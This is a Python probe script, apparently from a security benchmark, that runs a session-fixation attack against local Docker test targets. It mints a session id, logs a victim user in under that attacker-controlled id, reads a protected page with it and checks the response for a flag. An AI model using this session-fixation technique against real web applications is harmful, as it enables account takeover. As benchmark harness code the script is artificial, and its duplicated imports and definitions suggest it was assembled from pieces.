#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:40700",
    "v1": "http://127.0.0.1:40701",
}
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
import requests
_SET_COOKIE_SID = re.compile(r"_session_id=([A-Za-z0-9]+)")
TIMEOUT = 20
SESSION_KEY = "_session_id"
BASE = {
    "v0": "http://127.0.0.1:40700",
    "v1": "http://127.0.0.1:40701",
}
def new_flag():
    return os.environ.get("PCB_FLAG") or "PCBFLAG_UNSET"
X = os.environ.get("PCB_X") or new_flag()
HERE = Path(__file__).resolve().parent
def run_probe(candidate, *, version="v1"):
    
    base = BASE.get(version)
    if base is None:
        return {"version": version, "error": "no such version"}
    cand = candidate if isinstance(candidate, dict) else {}
    mode = cand.get("mode", "X")
    user = cand.get("user", "victim")

    if not _wait_ready(version):
        return {"version": version, "error": "env not ready before probe"}

    
    
    seed = requests.get(f"{base}/seed", timeout=TIMEOUT)
    m = _SET_COOKIE_SID.search(seed.headers.get("set-cookie", ""))
    if not m:
        return {"version": version, "error": "could not mint session id", "seed_headers": dict(seed.headers)}
    attacker_sid = m.group(1)

    
    _restart(version)

    # step3: residual warms the process so the shared-constant mutation disables the v1 guard;
    # seed (the process's FIRST request after restart) must NOT warm up.
    if mode != "seed":
        requests.get(f"{base}/", timeout=TIMEOUT)

    
    login = requests.get(
        f"{base}/login", params={"user": user, SESSION_KEY: attacker_sid}, timeout=TIMEOUT,
    )

    
    access = requests.get(
        f"{base}/protected", cookies={SESSION_KEY: attacker_sid}, timeout=TIMEOUT,
    )

    return {
        "version": version,
        "probe_id": cand.get("probe_id"),
        "mode": mode,
        "attacker_sid": attacker_sid,
        "login_status": login.status_code,
        "body": access.text.strip(),
        "X": X if (X and X in access.text) else "",
    }
def _restart(version: str) -> None:
    
    _compose("restart", version, env={"PCB_X": X})
    _wait_ready(version)
def _wait_ready(version: str, tries: int = 120) -> bool:
    
    base = BASE[version]
    for _ in range(tries):
        try:
            r = requests.get(f"{base}/ping.txt", timeout=5)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False
def _compose(*args, env=None):
    import os as _os
    proj = _os.environ.get("COMPOSE_PROJECT_NAME", "")
    cmd = ["docker", "compose", "-p", proj, "--project-directory", str(HERE.parent)]
    for p in ("v0", "v1", "v2"):
        cmd += ["--profile", p]
    cmd += list(args)
    return subprocess.run(
        cmd, text=True, capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))